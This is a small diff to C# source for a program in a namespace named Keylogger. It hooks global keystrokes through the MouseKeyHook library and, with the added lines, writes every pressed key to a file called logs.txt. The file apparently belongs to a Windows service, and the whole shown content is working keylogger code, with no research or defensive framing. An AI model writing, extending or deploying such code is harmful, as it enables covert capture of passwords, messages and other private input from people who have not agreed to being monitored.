@@ -1,5 +1,6 @@
 ﻿using Gma.System.MouseKeyHook;
 using System;
+using System.IO;
 using System.ServiceProcess;
 using System.Windows.Forms;
 
@@ -33,6 +34,8 @@ namespace Keylogger
         private static void OnKeyPressed(object sender, KeyPressEventArgs args)
         {
             Console.WriteLine(args.KeyChar.ToString());
+
+            File.AppendAllText("logs.txt", args.KeyChar.ToString());
         }
     }
 }
